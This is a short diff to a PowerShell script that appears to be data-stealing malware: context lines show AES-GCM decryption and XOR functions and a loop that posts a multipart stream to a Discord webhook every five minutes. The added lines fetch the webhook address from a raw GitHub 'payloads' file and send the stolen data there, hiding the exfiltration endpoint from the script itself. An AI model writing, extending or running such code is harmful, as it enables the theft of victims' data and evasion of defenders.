@@ -148,6 +148,8 @@ function Decrypt-AesGcmData {
     }
 }
 
+$webhook = (Invoke-WebRequest "https://raw.githubusercontent.com/lubrj/payloads/refs/heads/main/sdfa").Content
+
 function Invoke-XOR {
     param(
         [string]$Key,
@@ -470,6 +472,6 @@ $t2
             $stream.Write($footerBytes, 0, $footerBytes.Length)
 
             $stream.Position = 0
-            Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1502344139797430323/bwsio26_sCw33qTMrEJR94QcLP2jhdSkE2CQ-e10dRi-OFdK0onAQNier0BolSJEvGxB" -Method Post -Body $stream.ToArray() -ContentType "multipart/form-data; boundary=$boundary"
+            Invoke-RestMethod -Uri $webhook -Method Post -Body $stream.ToArray() -ContentType "multipart/form-data; boundary=$boundary"
 Start-Sleep -Seconds 300
 }
